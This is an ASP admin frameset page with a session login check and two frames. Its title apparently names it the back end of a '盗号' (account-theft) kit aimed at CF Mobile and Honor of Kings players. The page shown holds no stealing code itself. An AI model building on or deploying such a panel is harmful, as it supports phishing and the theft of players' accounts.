<!--#include file="conn.asp"-->
<%
If session("admin")="" then
    Response.Write "<script>alert('用户未登录，请登录');this.location.href='index.asp';</SCRIPT>"
	Response.End
End If
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/frameset.dtd">
<HTML><HEAD><TITLEby:盗号520---CF手游and王者荣耀后台</TITLE>
<META http-equiv=Content-Type content="text/html; charset=gb2312">
<META content="MSHTML 6.00.2900.2769" name=GENERATOR>
</HEAD>
<FRAMESET border=0 frameSpacing=0 rows=80,100% 
frameBorder=0><FRAME name=Top src="Top.asp" noResize 
scrolling=no>
<FRAME name=main 
src="about.asp">
</FRAMESET>
</FRAMESET><noframes></noframes>
</HTML>




